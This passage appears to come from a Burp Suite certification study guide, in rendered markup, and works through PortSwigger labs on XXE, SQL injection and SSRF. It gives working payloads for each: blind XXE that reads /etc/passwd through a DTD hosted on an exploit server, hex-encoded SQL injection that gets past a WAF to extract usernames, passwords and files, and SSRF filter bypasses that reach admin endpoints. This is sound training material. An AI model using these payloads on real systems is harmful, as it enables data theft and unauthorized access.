\u0026lt;/storeId\u0026gt;\n\u0026lt;/stockCheck\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;?\u003cspan class=\"pl-ent\"\u003exml\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e version\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1.0\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e encoding\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eUTF-8\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e standalone\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eno\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e?\u0026gt;\n\u0026lt;!\u003cspan class=\"pl-ent\"\u003eDOCTYPE\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eskippy\u003c/span\u003e [\u0026lt;!\u003cspan class=\"pl-k\"\u003eENTITY\u003c/span\u003e % \u003cspan class=\"pl-c1\"\u003epeanuts\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e SYSTEM \u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e PAYLOAD_POSITION \u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\u003cspan class=\"pl-c1\"\u003e%peanuts;\u003c/span\u003e ]\u0026gt;\n\u0026lt;\u003cspan class=\"pl-ent\"\u003estockCheck\u003c/span\u003e\u0026gt;\n \u0026lt;\u003cspan class=\"pl-ent\"\u003eproductId\u003c/span\u003e\u0026gt;\n  1\n \u0026lt;/\u003cspan class=\"pl-ent\"\u003eproductId\u003c/span\u003e\u0026gt;\n \u0026lt;\u003cspan class=\"pl-ent\"\u003estoreId\u003c/span\u003e\u0026gt;\n  1\n \u0026lt;/\u003cspan class=\"pl-ent\"\u003estoreId\u003c/span\u003e\u0026gt;\n\u0026lt;/\u003cspan class=\"pl-ent\"\u003estockCheck\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUse Burp Intruder with above GoSecure wordlists to find valid DTD files that can be repurposed to \u003cem\u003e\u003cstrong\u003eExploiting XXE to retrieve data exfil by repurposing a local DTD\u003c/strong\u003e\u003c/em\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xml_identify_existing_dtd_files.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xml_identify_existing_dtd_files.png\" alt=\"xml_identify_existing_dtd_files.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDTD Blind Error messages\u003c/h3\u003e\u003ca id=\"user-content-dtd-blind-error-messages\" class=\"anchor\" aria-label=\"Permalink: DTD Blind Error messages\" href=\"#dtd-blind-error-messages\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTrigger XML parsing errors in such a way that the error messages contain sensitive data.\u003cbr\u003e\nIf the out of band to Collaborator payload above do not work test if the target will call a \u003ccode\u003eexploit.dtd\u003c/code\u003e file with invalid reference\u003cbr\u003e\nand return response in an error message.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHosted on exploit server the \u003ccode\u003e/exploit.dtd\u003c/code\u003e file and body contents to \u003ccode\u003efile:///invalid/\u003c/code\u003e path.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;!ENTITY % file SYSTEM \u0026quot;file:///etc/passwd\u0026quot;\u0026gt;\n\u0026lt;!ENTITY % eval \u0026quot;\u0026lt;!ENTITY \u0026amp;#x25; exfil SYSTEM 'file:///invalid/%file;'\u0026gt;\u0026quot;\u0026gt;\n%eval;\n%exfil;\"\u003e\u003cpre\u003e\u0026lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"\u0026gt;\n\u0026lt;!ENTITY % eval \"\u0026lt;!ENTITY \u003cspan class=\"pl-c1\"\u003e\u0026amp;#x25;\u003c/span\u003e exfil SYSTEM 'file:///invalid/%file;'\u0026gt;\"\u0026gt;\n%eval;\n%exfil;\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOn the stock check XML post request insert the payload between definition and first element.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\n  \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY % xxe SYSTEM \u0026quot;https://EXPLOIT.net/exploit.dtd\u0026quot;\u0026gt; %xxe;]\u0026gt;\n  \u0026lt;stockCheck\u0026gt;\n    \u0026lt;productId\u0026gt;\n\t  1\n\t\u0026lt;/productId\u0026gt;\n\t\u0026lt;storeId\u0026gt;\n\t  1\n\t\u0026lt;/storeId\u0026gt;\n\u0026lt;/stockCheck\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;?\u003cspan class=\"pl-ent\"\u003exml\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e version\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1.0\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e encoding\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eUTF-8\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e?\u0026gt;\n  \u0026lt;!\u003cspan class=\"pl-ent\"\u003eDOCTYPE\u003c/span\u003e \u003cspan class=\"pl-e\"\u003efoo\u003c/span\u003e [\u0026lt;!\u003cspan class=\"pl-k\"\u003eENTITY\u003c/span\u003e % \u003cspan class=\"pl-c1\"\u003exxe\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e SYSTEM \u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttps://EXPLOIT.net/exploit.dtd\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt; \u003cspan class=\"pl-c1\"\u003e%xxe;\u003c/span\u003e]\u0026gt;\n  \u0026lt;\u003cspan class=\"pl-ent\"\u003estockCheck\u003c/span\u003e\u0026gt;\n    \u0026lt;\u003cspan class=\"pl-ent\"\u003eproductId\u003c/span\u003e\u0026gt;\n\t  1\n\t\u0026lt;/\u003cspan class=\"pl-ent\"\u003eproductId\u003c/span\u003e\u0026gt;\n\t\u0026lt;\u003cspan class=\"pl-ent\"\u003estoreId\u003c/span\u003e\u0026gt;\n\t  1\n\t\u0026lt;/\u003cspan class=\"pl-ent\"\u003estoreId\u003c/span\u003e\u0026gt;\n\u0026lt;/\u003cspan class=\"pl-ent\"\u003estockCheck\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dtd-exploit-invalid-error.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dtd-exploit-invalid-error.png\" alt=\"DTD Exploit invalid error\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting blind XXE to retrieve data via error messages\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eRabbit hole:\u003c/strong\u003e The submit feedback and screenshot upload on feedback is for \u003cem\u003e\u003cstrong\u003eNeo\u003c/strong\u003e\u003c/em\u003e to follow \u003cem\u003e\u003cstrong\u003eTrinity\u003c/strong\u003e\u003c/em\u003e in the Matrix.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSQL + XML + HackVertor\u003c/h3\u003e\u003ca id=\"user-content-sql--xml--hackvertor\" class=\"anchor\" aria-label=\"Permalink: SQL + XML + HackVertor\" href=\"#sql--xml--hackvertor\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe combination of vulnerabilities are \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e in a XML Post body and inserting mathematical expression such as \u003cstrong\u003e7x7\u003c/strong\u003e into field and observing the evaluated value. Using this type of XML and SQL injection with WAF filter bypass via encoding may allow extract of sensitive data.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-math-evaluated-xml.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-math-evaluated-xml.png\" alt=\"identify-math-evaluated-xml\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWAF detect attack when appending SQL query such as a UNION SELECT statement to the original store ID. Web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;storeId\u0026gt;1 UNION SELECT NULL\u0026lt;/storeId\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003estoreId\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eUNION\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eNULL\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003estoreId\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBypass the WAF, Use Burp extension \u003cstrong\u003e\u003ca href=\"https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100\" rel=\"nofollow\"\u003eHackvertor\u003c/a\u003e\u003c/strong\u003e to \u003ca href=\"#obfuscation\"\u003eobfuscate\u003c/a\u003e the SQL Injection payload in the XML post body.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/hackvertor.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/hackvertor.png\" alt=\"Web application firewall (WAF) bypass require obfuscate of malicious query with Hackvertor\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWebapp return one column, thus need to concatenate the returned usernames and passwords columns from the users table.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;storeId\u0026gt;\u0026lt;@hex_entities\u0026gt;1 UNION SELECT username || '~' || password FROM users\u0026lt;@/hex_entities\u0026gt;\u0026lt;/storeId\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;\u003cspan class=\"pl-ent\"\u003estoreId\u003c/span\u003e\u0026gt;\u0026lt;@hex_entities\u0026gt;1 UNION SELECT username || '~' || password FROM users\u0026lt;@/hex_entities\u0026gt;\u0026lt;/\u003cspan class=\"pl-ent\"\u003estoreId\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xml-sql-obfuscation.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xml-sql-obfuscation.png\" alt=\"SQL injection with filter bypass via XML encoding obfuscation\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBelow is sample SQLi payloads to read local file, or output to another folder on target.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;@hex_entities\u0026gt;1 UNION all select load_file('/home/carlos/secret')\u0026lt;@/hex_entities\u0026gt;  \n\n\u0026lt;@hex_entities\u0026gt;1 UNION all select load_file('/home/carlos/secret') into outfile '/tmp/secret'\u0026lt;@/hex_entities\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e@hex_entities\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eUNION all\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e load_file(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/home/carlos/secret\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e@\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ehex_entities\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e  \n\n\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e@hex_entities\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eUNION all\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e load_file(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/home/carlos/secret\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e) into outfile \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/tmp/secret\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e@\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ehex_entities\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding\" rel=\"nofollow\"\u003ePortSwigger Lab: SQL injection with filter bypass via XML encoding\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSSRF - Server Side Request Forgery\u003c/h2\u003e\u003ca id=\"user-content-ssrf---server-side-request-forgery\" class=\"anchor\" aria-label=\"Permalink: SSRF - Server Side Request Forgery\" href=\"#ssrf---server-side-request-forgery\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#ssrf-blacklist-filter\"\u003eSSRF blacklist filter\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#absolute-get-url--host-ssrf\"\u003eSSRF via Absolute GET URL + HOST Header\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#xxe--ssrf\"\u003eSSRF inside XXE\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#host-routing-based-ssrf\"\u003eSSRF HOST Routing-based\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#html-to-pdf\"\u003eSSRF inside HTML-to-PDF\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#ssrf-open-redirection\"\u003eSSRF Open Redirection\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#host-connection-state\"\u003eSSRF Consecutive Connection State\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eServer-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended malicious exploit location URL.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSSRF attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data. Burp scanner may detect SSRF issue as an, \u003ccode\u003eExternal service interaction (HTTP)\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSSRF Sample payloads.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"/product/nextProduct?currentProductId=6\u0026amp;path=https://EXPLOIT.net  \n\nstockApi=http://localhost:6566/admin  \n\nhttp://127.1:6566/admin  \n\nHost: localhost\"\u003e\u003cpre\u003e/product/nextProduct?currentProductId=6\u0026amp;path=https://EXPLOIT.net  \n\nstockApi=http://localhost:6566/admin  \n\nhttp://127.1:6566/admin  \n\nHost: localhost\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAlternative IP representation of \u003ccode\u003e127.0.0.1\u003c/code\u003e:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003e2130706433\u003c/li\u003e\n\u003cli\u003e017700000001\u003c/li\u003e\n\u003cli\u003e127.1\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSSRF blacklist filter\u003c/h3\u003e\u003ca id=\"user-content-ssrf-blacklist-filter\" class=\"anchor\" aria-label=\"Permalink: SSRF blacklist filter\" href=\"#ssrf-blacklist-filter\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the SSRF in the \u003ccode\u003estockAPI\u003c/code\u003e parameter, and bypass the block by changing the URL target localhost and admin endpoint to: \u003ccode\u003ehttp://127.1/%2561dmin\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDouble URL encode characters in URL to \u003cstrong\u003eObfuscate\u003c/strong\u003e the \u003ccode\u003ea\u003c/code\u003e to \u003ccode\u003e%2561\u003c/code\u003e, resulting in the bypass of the blacklist filter.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf-obfuscated.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf-obfuscated.png\" alt=\"ssrf obfuscated\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter\" rel=\"nofollow\"\u003ePortSwigger Lab: SSRF with blacklist-based input filter\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eAbsolute GET URL + HOST SSRF\u003c/h3\u003e\u003ca id=\"user-content-absolute-get-url--host-ssrf\" class=\"anchor\" aria-label=\"Permalink: Absolute GET URL + HOST SSRF\" href=\"#absolute-get-url--host-ssrf\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e SSRF flawed request parsing vulnerability by changing the \u003ccode\u003eHOST\u003c/code\u003e header to Collaborator server and providing an absolute URL in the GET request line and observe the response from the Collaborator server.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"GET https://TARGET.net/\nHost: OASTIFY.COM\"\u003e\u003cpre\u003eGET https://TARGET.net/\nHost: OASTIFY.COM\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-ssrf-host.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-ssrf-host.png\" alt=\"identify ssrf flawed request parsing host header\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUse the Host header to target 192.168.0.141 or \u003ccode\u003elocalhost\u003c/code\u003e, and notice the response give 302 status admin interface found. Append /admin to the absolute URL in the request line and send the request. Observe SSRF response.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf.png\" alt=\"ssrf\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"GET https://TARGET.net/admin/delete?csrf=cnHBVbOPl7Bptu3VCXQZh6MUYzMsEXgO\u0026amp;username=carlos HTTP/1.1\nHost: 192.168.0.114\nCookie: session=PQcb5CMC9ECh5fBobuxSalaBdxyLis01\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eGET https://TARGET.net/admin/delete?csrf=cnHBVbOPl7Bptu3VCXQZh6MUYzMsEXgO\u0026amp;username=carlos HTTP/1.1\nHost: 192.168.0.114\nCookie: session=PQcb5CMC9ECh5fBobuxSalaBdxyLis01\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing\" rel=\"nofollow\"\u003ePortSwigger Lab: 